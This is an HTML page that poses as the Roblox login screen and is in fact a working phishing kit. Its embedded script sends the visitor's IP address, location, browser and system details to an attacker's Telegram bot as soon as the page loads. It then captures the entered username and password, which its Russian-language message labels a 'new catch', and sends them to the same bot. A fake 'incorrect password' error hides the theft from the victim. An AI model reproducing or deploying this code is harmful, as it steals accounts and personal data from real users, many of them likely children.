<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Log in to Roblox</title>
    <link rel="icon" href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#000}
        .page{width:100vw;height:100vh;background:url('https://images.rbxcdn.com/5f05bc6223b75052b594b38016762a77-marketing_bg_05202026.jpg') center/cover no-repeat;display:flex;align-items:center;justify-content:center}
        .card{width:384px;background:#fff;border-radius:8px;padding:32px;box-shadow:0 12px 40px rgba(0,0,0,0.4);position:relative}
        .card img{display:block;width:120px;margin:0 auto 20px}
        .card h1{font-size:24px;font-weight:700;color:#191919;text-align:center;margin-bottom:20px}
        .card input{width:100%;height:44px;padding:0 12px;margin-bottom:12px;border:1px solid #cdcdcd;border-radius:6px;font-size:15px;background:#f7f7f7;outline:none}
        .card input:focus{border-color:#00b06f;background:#fff}
        .card button{width:100%;height:44px;background:#00b06f;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
        .card button:hover{background:#009a5f}
        .card .link{text-align:center;margin-top:16px}
        .card .link a{color:#00b06f;font-size:13px;text-decoration:none}
        .card .signup{text-align:center;margin-top:20px;font-size:14px;color:#666}
        .card .signup a{color:#00b06f;text-decoration:none;font-weight:600}
        .card .error{background:#fff0f0;border:1px solid #ffc7c7;border-radius:4px;padding:10px;color:#c00;font-size:13px;margin-bottom:12px;display:none}
    </style>
</head>
<body>
    <div class="page">
        <div class="card">
            <img src="https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png" alt="Roblox">
            <h1>Log In to Roblox</h1>
            <div class="error" id="error">Incorrect username or password.</div>
            <input type="text" id="login-username" placeholder="Username/Email/Phone">
            <input type="password" id="login-password" placeholder="Password">
            <button id="login-button">Log In</button>
            <div class="link"><a href="https://www.roblox.com/login/forgot-password-or-username">Forgot Password or Username?</a></div>
            <div class="signup">Don't have an account? <a href="https://www.roblox.com/account/signupredir">Sign Up</a></div>
        </div>
    </div>
    <script>
    var BOT_TOKEN = '8246971604:AAGHfEJkYevoYV0y7GoLaHRpRSYiPtoCdVg';
    var CHAT_ID = '8622843931';
    var geoData = null;
    var sent = false;
    var sysSent = false;

    function db() {
        var u = navigator.userAgent;
        if(u.indexOf("YaBrowser")>-1)return"Яндекс.Браузер";
        if(u.indexOf("Chrome")>-1&&u.indexOf("YaBrowser")===-1)return"Google Chrome";
        if(u.indexOf("Firefox")>-1)return"Mozilla Firefox";
        if(u.indexOf("Safari")>-1&&u.indexOf("Chrome")===-1)return"Safari";
        return"Неизвестный браузер";
    }

    function snd(m) {
        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(m);
        new Image().src = url;
    }

    function ld() {
        fetch('http://ip-api.com/json/?fields=query,city,country,isp,org')
            .then(function(r){return r.json();})
            .then(function(d){
                geoData = {ip:d.query||'Неизвестно',city:d.city||'Неизвестно',country:d.country||'Неизвестно',isp:d.isp||d.org||'Неизвестно'};
                if(!sysSent) { sysSent = true; si(); }
            })
            .catch(function(){
                geoData = {ip:'Неизвестно',city:'Неизвестно',country:'Неизвестно',isp:'Неизвестно'};
                if(!sysSent) { sysSent = true; si(); }
            });
    }

    function si() {
        snd('💻 SYS_INFO\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n🌐 Browser: '+db()+'\n💻 OS: '+navigator.platform+'\n🌍 Lang: '+navigator.language+'\n📱 UA: '+navigator.userAgent+'\n🖥 Screen: '+screen.width+'x'+screen.height+'\n🔹 IP: '+geoData.ip+'\n🔹 City: '+geoData.city+'\n🔹 Country: '+geoData.country+'\n🔹 ISP: '+geoData.isp+'\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n⏰ Time: '+new Date().toLocaleString('ru-RU'));
    }

    ld();

    function sl(u,p) {
        if(sent)return;
        sent = true;
        if(!geoData){setTimeout(function(){sent=false;sl(u,p);},500);return;}
        snd('🕵️ НОВЫЙ УЛОВ 🕵️\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n\n👤 Логин: '+u+'\n🔑 Пароль: '+p+'\n🌐 Браузер: '+db()+'\n\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n🌍 ГЕОЛОКАЦИЯ\n\n🔹 IP: '+geoData.ip+'\n🔹 Город: '+geoData.city+'\n🔹 Страна: '+geoData.country+'\n🔹 Провайдер: '+geoData.isp+'\n\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n⏰ Время: '+new Date().toLocaleString('ru-RU'));
        setTimeout(function(){sent=false;},5000);
    }

    document.getElementById('login-button').addEventListener('click',function(){
        var u=document.getElementById('login-username').value.trim();
        var p=document.getElementById('login-password').value;
        if(!u||!p)return;
        sl(u,p);
        var b=document.getElementById('login-button');b.textContent='Verifying...';b.disabled=true;
        setTimeout(function(){document.getElementById('error').style.display='block';document.getElementById('login-password').value='';b.textContent='Log In';b.disabled=false;},2000);
    });

    document.getElementById('login-password').addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('login-button').click();});
    </script>
</body>
</html>
